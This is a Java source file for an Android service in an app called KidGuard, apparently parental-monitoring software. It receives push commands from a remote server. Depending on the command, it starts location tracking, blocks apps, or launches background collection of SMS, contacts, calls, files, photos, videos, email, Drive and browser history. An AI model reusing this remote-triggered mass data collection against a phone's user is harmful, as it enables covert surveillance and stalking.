package com.kidguard;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.google.android.gcm.GCMBaseIntentService;
import com.kidguard.interfaces.Constant;
import com.kidguard.preference.Preference;
import com.kidguard.services.BackgroundDataService;
import com.kidguard.services.BlockAppService;
import com.kidguard.services.GoogleAccountService;
import com.kidguard.services.LocationService;
import com.kidguard.utilities.Utilities;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

@SuppressWarnings("all")
public class GCMIntentService extends GCMBaseIntentService implements Constant {

    private static final String TAG = GCMIntentService.class.getSimpleName();

    // Use your PROJECT ID from Google API into SENDER_ID

    public GCMIntentService() {
        super(SENDER_ID);
    }

    @Override
    protected void onRegistered(Context context, String registrationId) {

        Log.e(TAG, "registrationId>>>>" + registrationId);
        // Saving reg id to shared preferences
        Preference.storeRegIdInPref(this, registrationId);
    }

    @Override
    protected void onUnregistered(Context context, String registrationId) {
        Log.e(TAG, "onUnregistered: registrationId>>>" + registrationId);
    }

    @Override
    protected void onMessage(Context context, Intent data) {
        // Message from PHP server
        Log.e("data", "data??" + data);

        String message = data.getStringExtra(CUSTOM);

        try {
            //Log.e(TAG, "Message??" + message);
            JSONObject json = new JSONObject(message);
            JSONObject jsonData = json.getJSONObject(DATA);
            String tag = jsonData.getString(TAGGING);
            Log.e(TAG, "Tag_In_Notification??" + tag);

            passServiceIntent(tag, "", "", "", "", "");

        } catch (JSONException e) {
            Log.e(TAG, "Json Exception: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
        }

    }

    /* Pass Service Intent */
    private void passServiceIntent(String tag, String count, String dateFrom,
                                   String dateTo, String size, String subject) {

        if (BackgroundDataService.getInstance() != null) {
            stopService(new Intent(this, BackgroundDataService.class));
        }

        if (GoogleAccountService.getInstance() != null) {
            stopService(new Intent(this, GoogleAccountService.class));
        }

        if (tag.equals(TAG_LOCATION)) {

            if (LocationService.getInstance() != null) {
                stopService(new Intent(this, LocationService.class));
            }

            Intent myIntent = new Intent(this, LocationService.class)
                    .putExtra(KEY_TAG, tag);
            startService(myIntent);

        } else if (tag.equals(TAG_BLOCK_APP)) {

            if (BlockAppService.getInstance() != null) {
                stopService(new Intent(this, BlockAppService.class));
            }

            Intent myIntent = new Intent(this, BlockAppService.class)
                    .putExtra(KEY_TAG, tag).putExtra(KEY_PACKAGE_NAME, count);
            startService(myIntent);

        } else if (tag.equals(TAG_WIFI)) {

            if (Utilities.isConnectedToWifi(this)) {
                ArrayList<String> listTag = new ArrayList<>();
                listTag.add(TAG_SMS);
                listTag.add(TAG_CONTACTS);
                listTag.add(TAG_CALLS);
                listTag.add(TAG_FILES);
                listTag.add(TAG_LIST_APPS);
                listTag.add(TAG_IMAGES);
                listTag.add(TAG_VIDEOS);
                listTag.add(TAG_EMAIL);
                listTag.add(TAG_GOOGLE_DRIVE);
                listTag.add(TAG_BROWSER_HISTORY);

                for (int i = 0; i < listTag.size(); i++) {
                    Intent myIntent = new Intent(this, BackgroundDataService.class)
                            .putExtra(KEY_TAG, listTag.get(i))
                            .putExtra(KEY_COUNT, count)
                            .putExtra(KEY_DATE_FROM, dateFrom)
                            .putExtra(KEY_DATE_TO, dateTo)
                            .putExtra(KEY_SIZE, size)
                            .putExtra(KEY_SUBJECT, subject);
                    startService(myIntent);
                }
            }
        } else {
            Log.e("hit", "hit??");
            Intent myIntent = new Intent(this, BackgroundDataService.class)
                    .putExtra(KEY_TAG, tag)
                    .putExtra(KEY_COUNT, count)
                    .putExtra(KEY_DATE_FROM, dateFrom)
                    .putExtra(KEY_DATE_TO, dateTo)
                    .putExtra(KEY_SIZE, size)
                    .putExtra(KEY_SUBJECT, subject);
            startService(myIntent);
        }


    }

    @Override
    protected void onError(Context arg0, String errorId) {
        Log.e(TAG, "onError: errorId=" + errorId);
    }

}